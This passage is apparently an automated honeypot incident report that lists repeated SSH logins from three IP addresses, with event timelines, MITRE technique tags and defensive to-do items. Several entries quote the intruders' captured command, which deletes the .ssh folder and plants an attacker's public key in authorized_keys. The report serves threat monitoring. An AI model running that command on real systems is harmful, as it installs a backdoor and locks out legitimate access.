| `2026-06-13 22:05:32` | `cowrie.command.failed` |
| `2026-06-13 22:05:33` | `cowrie.log.closed` |
| `2026-06-13 22:05:33` | `cowrie.session.params` |
| `2026-06-13 22:05:33` | `cowrie.command.input` |
| `2026-06-13 22:05:33` | `cowrie.session.file_download` |
| `2026-06-13 22:05:33` | `cowrie.log.closed` |
| `2026-06-13 22:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32c756ce847

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:05 |
| **Last Seen** | 2026-06-13 22:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:05:35` | `cowrie.session.connect` |
| `2026-06-13 22:05:35` | `cowrie.client.version` |
| `2026-06-13 22:05:35` | `cowrie.client.kex` |
| `2026-06-13 22:05:36` | `cowrie.login.success` |
| `2026-06-13 22:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1049cefb0fba

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:07 |
| **Last Seen** | 2026-06-13 22:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:07:10` | `cowrie.session.connect` |
| `2026-06-13 22:07:10` | `cowrie.client.version` |
| `2026-06-13 22:07:10` | `cowrie.client.kex` |
| `2026-06-13 22:07:11` | `cowrie.login.success` |
| `2026-06-13 22:07:11` | `cowrie.session.params` |
| `2026-06-13 22:07:11` | `cowrie.command.input` |
| `2026-06-13 22:07:11` | `cowrie.command.failed` |
| `2026-06-13 22:07:11` | `cowrie.log.closed` |
| `2026-06-13 22:07:12` | `cowrie.session.params` |
| `2026-06-13 22:07:12` | `cowrie.command.input` |
| `2026-06-13 22:07:12` | `cowrie.session.file_download` |
| `2026-06-13 22:07:12` | `cowrie.log.closed` |
| `2026-06-13 22:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c3f9c8e1a4

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:07 |
| **Last Seen** | 2026-06-13 22:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:07:14` | `cowrie.session.connect` |
| `2026-06-13 22:07:14` | `cowrie.client.version` |
| `2026-06-13 22:07:14` | `cowrie.client.kex` |
| `2026-06-13 22:07:15` | `cowrie.login.success` |
| `2026-06-13 22:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cdfcd4aa987

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:07 |
| **Last Seen** | 2026-06-13 22:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:07:24` | `cowrie.session.connect` |
| `2026-06-13 22:07:24` | `cowrie.client.version` |
| `2026-06-13 22:07:24` | `cowrie.client.kex` |
| `2026-06-13 22:07:26` | `cowrie.login.success` |
| `2026-06-13 22:07:26` | `cowrie.session.params` |
| `2026-06-13 22:07:26` | `cowrie.command.input` |
| `2026-06-13 22:07:26` | `cowrie.command.failed` |
| `2026-06-13 22:07:27` | `cowrie.log.closed` |
| `2026-06-13 22:07:28` | `cowrie.session.params` |
| `2026-06-13 22:07:28` | `cowrie.command.input` |
| `2026-06-13 22:07:28` | `cowrie.session.file_download` |
| `2026-06-13 22:07:28` | `cowrie.log.closed` |
| `2026-06-13 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c7d7ce79a1

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:07 |
| **Last Seen** | 2026-06-13 22:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:07:32` | `cowrie.session.connect` |
| `2026-06-13 22:07:32` | `cowrie.client.version` |
| `2026-06-13 22:07:32` | `cowrie.client.kex` |
| `2026-06-13 22:07:34` | `cowrie.login.success` |
| `2026-06-13 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85feb4d3ba08

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:08 |
| **Last Seen** | 2026-06-13 22:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:08:23` | `cowrie.session.connect` |
| `2026-06-13 22:08:23` | `cowrie.client.version` |
| `2026-06-13 22:08:23` | `cowrie.client.kex` |
| `2026-06-13 22:08:24` | `cowrie.login.success` |
| `2026-06-13 22:08:24` | `cowrie.session.params` |
| `2026-06-13 22:08:24` | `cowrie.command.input` |
| `2026-06-13 22:08:24` | `cowrie.command.failed` |
| `2026-06-13 22:08:24` | `cowrie.log.closed` |
| `2026-06-13 22:08:24` | `cowrie.session.params` |
| `2026-06-13 22:08:24` | `cowrie.command.input` |
| `2026-06-13 22:08:24` | `cowrie.session.file_download` |
| `2026-06-13 22:08:24` | `cowrie.log.closed` |
| `2026-06-13 22:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a297b432cba1

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:08 |
| **Last Seen** | 2026-06-13 22:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:08:26` | `cowrie.session.connect` |
| `2026-06-13 22:08:26` | `cowrie.client.version` |
| `2026-06-13 22:08:26` | `cowrie.client.kex` |
| `2026-06-13 22:08:26` | `cowrie.login.success` |
| `2026-06-13 22:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85f9e3dad50

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:10 |
| **Last Seen** | 2026-06-13 22:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:10:25` | `cowrie.session.connect` |
| `2026-06-13 22:10:25` | `cowrie.client.version` |
| `2026-06-13 22:10:25` | `cowrie.client.kex` |
| `2026-06-13 22:10:25` | `cowrie.login.success` |
| `2026-06-13 22:10:25` | `cowrie.session.params` |
| `2026-06-13 22:10:25` | `cowrie.command.input` |
| `2026-06-13 22:10:25` | `cowrie.command.failed` |
| `2026-06-13 22:10:26` | `cowrie.log.closed` |
| `2026-06-13 22:10:26` | `cowrie.session.params` |
| `2026-06-13 22:10:26` | `cowrie.command.input` |
| `2026-06-13 22:10:26` | `cowrie.session.file_download` |
| `2026-06-13 22:10:26` | `cowrie.log.closed` |
| `2026-06-13 22:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc17c726d6c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:10 |
| **Last Seen** | 2026-06-13 22:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:10:25` | `cowrie.session.connect` |
| `2026-06-13 22:10:25` | `cowrie.client.version` |
| `2026-06-13 22:10:25` | `cowrie.client.kex` |
| `2026-06-13 22:10:26` | `cowrie.login.success` |
| `2026-06-13 22:10:26` | `cowrie.session.params` |
| `2026-06-13 22:10:26` | `cowrie.command.input` |
| `2026-06-13 22:10:26` | `cowrie.command.failed` |
| `2026-06-13 22:10:27` | `cowrie.log.closed` |
| `2026-06-13 22:10:27` | `cowrie.session.params` |
| `2026-06-13 22:10:27` | `cowrie.command.input` |
| `2026-06-13 22:10:27` | `cowrie.session.file_download` |
| `2026-06-13 22:10:27` | `cowrie.log.closed` |
| `2026-06-13 22:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b1011aa2b3

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:10 |
| **Last Seen** | 2026-06-13 22:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:10:28` | `cowrie.session.connect` |
| `2026-06-13 22:10:28` | `cowrie.client.version` |
| `2026-06-13 22:10:28` | `cowrie.client.kex` |
| `2026-06-13 22:10:28` | `cowrie.login.success` |
| `2026-06-13 22:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b527bdfefee

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:10 |
| **Last Seen** | 2026-06-13 22:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:10:29` | `cowrie.session.connect` |
| `2026-06-13 22:10:29` | `cowrie.client.version` |
| `2026-06-13 22:10:29` | `cowrie.client.kex` |
| `2026-06-13 22:10:30` | `cowrie.login.success` |
| `2026-06-13 22:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec1fadf1612

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:12 |
| **Last Seen** | 2026-06-13 22:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:12:44` | `cowrie.session.connect` |
| `2026-06-13 22:12:44` | `cowrie.client.version` |
| `2026-06-13 22:12:44` | `cowrie.client.kex` |
| `2026-06-13 22:12:46` | `cowrie.login.success` |
| `2026-06-13 22:12:46` | `cowrie.session.params` |
| `2026-06-13 22:12:46` | `cowrie.command.input` |
| `2026-06-13 22:12:46` | `cowrie.command.failed` |
| `2026-06-13 22:12:47` | `cowrie.log.closed` |
| `2026-06-13 22:12:48` | `cowrie.session.params` |
| `2026-06-13 22:12:48` | `cowrie.command.input` |
| `2026-06-13 22:12:48` | `cowrie.session.file_download` |
| `2026-06-13 22:12:48` | `cowrie.log.closed` |
| `2026-06-13 22:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31b5b1e3eb8

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:12 |
| **Last Seen** | 2026-06-13 22:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:12:52` | `cowrie.session.connect` |
| `2026-06-13 22:12:52` | `cowrie.client.version` |
| `2026-06-13 22:12:52` | `cowrie.client.kex` |
| `2026-06-13 22:12:54` | `cowrie.login.success` |
| `2026-06-13 22:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7bb1187f5d

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:16 |
| **Last Seen** | 2026-06-13 22:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:16:23` | `cowrie.session.connect` |
| `2026-06-13 22:16:23` | `cowrie.client.version` |
| `2026-06-13 22:16:23` | `cowrie.client.kex` |
| `2026-06-13 22:16:23` | `cowrie.login.success` |
| `2026-06-13 22:16:24` | `cowrie.session.params` |
| `2026-06-13 22:16:24` | `cowrie.command.input` |
| `2026-06-13 22:16:24` | `cowrie.command.failed` |
| `2026-06-13 22:16:24` | `cowrie.log.closed` |
| `2026-06-13 22:16:24` | `cowrie.session.params` |
| `2026-06-13 22:16:24` | `cowrie.command.input` |
| `2026-06-13 22:16:24` | `cowrie.session.file_download` |
| `2026-06-13 22:16:24` | `cowrie.log.closed` |
| `2026-06-13 22:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b279f0190a4

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:16 |
| **Last Seen** | 2026-06-13 22:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:16:26` | `cowrie.session.connect` |
| `2026-06-13 22:16:26` | `cowrie.client.version` |
| `2026-06-13 22:16:26` | `cowrie.client.kex` |
| `2026-06-13 22:16:26` | `cowrie.login.success` |
| `2026-06-13 22:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e39aee5b78b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:17 |
| **Last Seen** | 2026-06-13 22:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:17:00` | `cowrie.session.connect` |
| `2026-06-13 22:17:00` | `cowrie.client.version` |
| `2026-06-13 22:17:00` | `cowrie.client.kex` |
| `2026-06-13 22:17:00` | `cowrie.login.success` |
| `2026-06-13 22:17:01` | `cowrie.session.params` |
| `2026-06-13 22:17:01` | `cowrie.command.input` |
| `2026-06-13 22:17:01` | `cowrie.command.failed` |
| `2026-06-13 22:17:01` | `cowrie.log.closed` |
| `2026-06-13 22:17:01` | `cowrie.session.params` |
| `2026-06-13 22:17:01` | `cowrie.command.input` |
| `2026-06-13 22:17:01` | `cowrie.session.file_download` |
| `2026-06-13 22:17:01` | `cowrie.log.closed` |
| `2026-06-13 22:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0edebc6df6d

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:17 |
| **Last Seen** | 2026-06-13 22:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:17:04` | `cowrie.session.connect` |
| `2026-06-13 22:17:04` | `cowrie.client.version` |
| `2026-06-13 22:17:04` | `cowrie.client.kex` |
| `2026-06-13 22:17:04` | `cowrie.login.success` |
| `2026-06-13 22:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

